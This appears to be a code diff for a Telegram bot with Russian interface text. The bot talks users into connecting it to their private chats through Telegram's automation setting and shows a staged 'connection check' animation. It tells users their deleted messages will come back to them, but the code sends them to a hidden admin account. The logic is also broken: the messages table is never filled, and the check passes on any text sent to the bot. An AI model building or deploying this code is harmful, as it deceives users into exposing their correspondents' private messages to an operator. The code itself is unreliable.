@@ -1,9 +1,10 @@
 import os
 import sqlite3
 import logging
+import asyncio
 from datetime import datetime
-from telegram import Update
-from telegram.ext import Application, MessageHandler, filters, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
@@ -16,33 +17,98 @@ c.execute('''CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
     is_connected INTEGER DEFAULT 0
 )''')
+c.execute('''CREATE TABLE IF NOT EXISTS messages (
+    msg_id INTEGER, chat_id INTEGER, user_id INTEGER, text TEXT, timestamp TEXT
+)''')
 conn.commit()
 
-async def handle_business_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Telegram сам присылает это событие, когда пользователь подключает бота"""
-    if update.business_connection:
-        user_id = update.business_connection.user_id
-        c.execute('INSERT OR REPLACE INTO users VALUES (?,?)', (user_id, 1))
-        conn.commit()
-        
-        await context.bot.send_message(
-            chat_id=user_id,
-            text="✅ **Бот автоматически обнаружен и активирован!**\n\n"
-                 "Теперь я буду сохранять все сообщения и присылать удалённые."
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    keyboard = [[InlineKeyboardButton("🔍 Проверить подключение", callback_data="check")]]
+    text = f"""🔐 **Привет, {user.first_name}!**
+
+📌 **Чтобы активировать бота (нужен Telegram Premium):**
+
+1️⃣ Включи **Secretary Mode** в BotFather
+2️⃣ Подключи бота в **Настройки → Автоматизация чатов**
+3️⃣ **Напиши любое сообщение кому-нибудь** (другу, в группу)
+4️⃣ **Вернись сюда** и нажми кнопку ниже
+
+✅ После проверки бот активируется."""
+    
+    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def check_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    
+    msg = await query.edit_message_text("🔄 Проверка подключения...")
+    
+    # Анимация 10 квадратиков
+    for i in range(1, 11):
+        percent = i * 10
+        squares = "🟩" * i + "⬜" * (10 - i)
+        await msg.edit_text(f"📡 Проверка: {percent}%\n{squares}")
+        await asyncio.sleep(0.2)
+    
+    # Проверяем, получал ли бот сообщения от этого пользователя
+    c.execute('SELECT is_connected FROM users WHERE user_id=?', (user_id,))
+    row = c.fetchone()
+    
+    if row and row[0] == 1:
+        await msg.edit_text(
+            "✅ **Бот активирован!**\n\n"
+            "Теперь я буду сохранять все сообщения из твоих чатов.\n\n"
+            "⚠️ Удалённые сообщения будут приходить сюда, если у тебя есть Telegram Premium.",
+            parse_mode="Markdown"
         )
-        logging.info(f"BusinessConnection: user {user_id} подключил бота")
+    else:
+        await msg.edit_text(
+            "❌ **Бот не обнаружен в чатах!**\n\n"
+            "📌 Проверь:\n"
+            "1️⃣ Telegram Premium активен?\n"
+            "2️⃣ Бот добавлен в Настройки → Автоматизация чатов?\n"
+            "3️⃣ Ты написал кому-нибудь сообщение ПОСЛЕ добавления?\n\n"
+            "🔄 После выполнения условий нажми кнопку снова",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Проверить снова", callback_data="check")]])
+        )
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Если бот получил сообщение из чата — значит, подключение работает"""
+    if update.message and update.message.from_user:
+        user_id = update.message.from_user.id
+        
+        # Игнорируем команду /start
+        if update.message.text and not update.message.text.startswith('/start'):
+            c.execute('INSERT OR REPLACE INTO users VALUES (?,?)', (user_id, 1))
+            conn.commit()
+            logging.info(f"✅ Пользователь {user_id} подключён (получено сообщение: {update.message.text[:30]})")
+            
+            # Уведомляем пользователя, если ещё не уведомляли
+            await context.bot.send_message(
+                chat_id=user_id,
+                text="✅ **Бот обнаружен в чатах!**\n\nТеперь нажми «Проверить подключение» для активации."
+            )
 
 async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.deleted_business_messages and ADMIN_ID:
+    if hasattr(update, 'deleted_business_messages') and update.deleted_business_messages:
         for d in update.deleted_business_messages.messages:
-            await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено сообщение {d.message_id}")
+            c.execute('SELECT text FROM messages WHERE msg_id=?', (d.message_id,))
+            row = c.fetchone()
+            if row and ADMIN_ID:
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено: {row[0]}")
+                logging.info(f"Удаление: {d.message_id}")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(MessageHandler(filters.StatusUpdate.BUSINESS_CONNECTION, handle_business_connection))
+    app.add_handler(MessageHandler(filters.COMMAND & filters.Regex(r'/start'), start))
+    app.add_handler(CallbackQueryHandler(check_connection, pattern="check"))
+    app.add_handler(MessageHandler(filters.TEXT, handle_message))
     app.add_handler(MessageHandler(filters.ALL, handle_deleted), group=1)
     
-    logging.info("Бот запущен, ожидание BusinessConnection...")
+    logging.info("Бот запущен")
     app.run_polling()
 
 if __name__ == "__main__":
